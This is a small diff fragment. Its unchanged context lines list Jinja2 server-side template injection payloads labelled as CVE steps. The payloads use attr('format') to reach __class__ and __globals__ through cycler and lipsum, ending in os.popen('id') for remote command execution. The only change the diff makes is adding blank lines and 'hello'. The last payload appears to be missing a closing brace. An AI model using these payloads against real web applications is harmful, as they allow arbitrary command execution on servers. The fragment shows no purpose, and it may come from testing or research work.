@@ -9,3 +9,6 @@
             STEP2-cve-class-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
             STEP3-cve-globals-lipsum: {{ ''|attr('format')('{0.__globals__}', lipsum) }}
             STEP4-cve-rce-id: {{ ''|attr('format')('{0.__globals__[os].popen(arg).read()}', lipsum, arg='id') }
+
+
+hello
